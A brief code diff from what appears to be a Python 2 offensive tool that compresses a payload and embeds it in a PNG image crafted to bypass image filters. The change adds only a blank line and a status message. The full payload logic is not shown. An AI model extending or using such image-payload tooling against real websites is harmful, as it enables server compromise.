@@ -58,6 +58,7 @@ def calcBruteMethod(remoteDomain, prefix, tld):
 		print "[+] Unknown tld, attempting slow method"
 		gzdeflatePayload = vakamilBrute(targetPayload, prefix, tld)
 		return gzdeflatePayload
+
 def filterBypass(gzdeflatePayload):
 	print "[+]Crafting payload to bypass PNG filters..."
 	pList=[]
@@ -93,6 +94,7 @@ def filterBypass(gzdeflatePayload):
 	return payload
 
 def generateFinalPayload(payload, outputImage):
+	print "[+] Generating final PNG payload..."
 	#Thanks to admanLogue and hLk_886 for this PNG Code
 	im = Image.new('RGB', (32,32))
 	i = 0
